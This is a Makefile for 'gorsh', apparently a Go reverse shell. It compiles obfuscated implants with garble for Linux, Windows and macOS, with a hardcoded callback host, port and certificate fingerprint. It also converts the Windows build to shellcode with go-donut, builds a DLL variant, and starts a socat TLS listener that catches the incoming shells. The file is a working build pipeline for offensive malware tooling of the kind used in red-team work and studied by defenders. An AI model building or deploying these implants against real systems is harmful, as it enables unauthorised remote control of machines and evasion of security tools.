APP = gorsh
OUT = build

SRV_KEY = certs/server.key
SRV_PEM = certs/server.pem

BUILD = go build -trimpath

PLATFORMS = linux windows darwin
target = $(word 1, $@)

LHOST ?= 127.0.0.1
LPORT ?= 8443
PORT  ?= 8443

FINGERPRINT = $(shell openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)
LDFLAGS = "-s -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"

GARBLE = ${GOPATH}/bin/garble
GODONUT = ${GOPATH}/bin/go-donut
SOCAT = /usr/bin/socat

ifneq ($(UNAME), Windows)
	DLLCC=x86_64-w64-mingw32-gcc
endif

.PHONY: all
all: $(PLATFORMS) shellcode dll

.PHONY: $(PLATFORMS)
${PLATFORMS}: $(SRV_KEY) $(GARBLE)
	GOOS=${target} ${BUILD} \
		-buildmode pie \
		-ldflags ${LDFLAGS} \
		-o ${OUT}/${APP}.${target} \
		cmd/gorsh/main.go

.PHONY: listen
listen: $(SRV_KEY) $(SOCAT)
	@test -n "$(PORT)" || (echo "PORT not defined"; exit 1)
	${SOCAT} -d \
		OPENSSL-LISTEN:${PORT},fork,key=${SRV_KEY},cert=${SRV_PEM},reuseaddr,verify=0 \
		EXEC:scripts/${target}.sh

		# EXEC:scripts/${target}.sh

.PHONY: shellcode
shellcode: $(GODONUT) windows
	${GODONUT} --arch x64 --verbose \
		--in ${OUT}/${APP}.windows \
		--out ${OUT}/${APP}.windows.bin 

.PHONY: dll
dll:
	CGO_ENABLED=1 CC=${DLLCC} \
	GOOS=windows ${BUILD} \
		-buildmode=c-shared \
		-trimpath \
		${ZSTD.windows} \
		-ldflags ${LDFLAGS} \
		-o ${OUT}/${APP}.windows.dll \
		cmd/gorsh-dll/dllmain.go

.PHONY: clean
clean:
	rm -rf ${OUT} certs/*


## Dependency Management

$(GODONUT):
	go install github.com/Binject/go-donut@latest

$(GARBLE):
	go install mvdan.cc/garble@latest

$(SOCAT):
	sudo apt get install socat

$(SRV_KEY) $(SRV_PEM) &:
	mkdir -p certs
	openssl req -subj '/CN=localhost/O=Localhost/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
	@cat ${SRV_KEY} >> ${SRV_PEM}
